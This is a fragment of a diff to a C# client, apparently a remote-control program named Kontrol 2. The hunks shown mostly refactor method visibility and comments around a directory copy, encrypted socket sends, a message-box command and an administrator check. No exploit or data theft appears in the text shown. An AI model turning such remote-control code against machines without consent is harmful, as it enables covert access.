 			FileInfo[] files = dir.GetFiles();
 			foreach (FileInfo file in files)
 			{
@@ -1666,7 +1658,7 @@ namespace Kontrol_2_Client
 				file.CopyTo(tempPath, false);
 			}
 
-			// If copying subdirectories, copy them and their contents to new location.
+			//  If copying subdirectories, copy them and their contents to new location.
 			if (copySubDirs)
 			{
 				foreach (DirectoryInfo subdir in dirs)
@@ -1676,7 +1668,8 @@ namespace Kontrol_2_Client
 				}
 			}
 		}
-		public static void Send(string response)
+
+		static void Send(string response)
 		{
 			string r = response;
 
@@ -1684,20 +1677,20 @@ namespace Kontrol_2_Client
 			byte[] data = Encoding.Unicode.GetBytes(encrypted);
 			if (fo_mode != 1)
 				_clientSocket.Send(data);
-			/*if (fo_size == 0)
-				_clientSocket.Send(data);*/
 		}
-		public static int SendBytes(byte[] data)
-		{;
+
+		static int SendBytes(byte[] data)
+		{
 			return _clientSocket.Send(data);
 		}
 
-		public static void ReportError(string text, string title = "An Error occured on the client side", MessageBoxButtons btn = MessageBoxButtons.OK, MessageBoxIcon icn = MessageBoxIcon.Error)
+		static void ReportError(string text, string title = "An Error occured on the client side", MessageBoxButtons btn = MessageBoxButtons.OK, MessageBoxIcon icn = MessageBoxIcon.Error)
 		{
 			Send($"display_msgbox\n{title}\n{(int) icn}\n{(int) btn}\n@{{msg}}{text}");
-			//Send("display_msgbox\nAn Error occured on the client side\n1\n1\n@{msg}Error: Either device is in use or something's wrong with my code.\nClick 'OK' to see the full exception.");
+			// Send("display_msgbox\nAn Error occured on the client side\n1\n1\n@[msg]Error: Either device is in use or something's wrong with my code.\nClick 'OK' to see the full exception.");
 		}
-		public static bool IsAdmin()
+
+		static bool IsAdmin()
 		{
 			using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
 			{
@@ -1705,5 +1698,6 @@ namespace Kontrol_2_Client
 				return principal.IsInRole(WindowsBuiltInRole.Administrator);
 			}
 		}
-	}
+        #endregion
+    }
 }
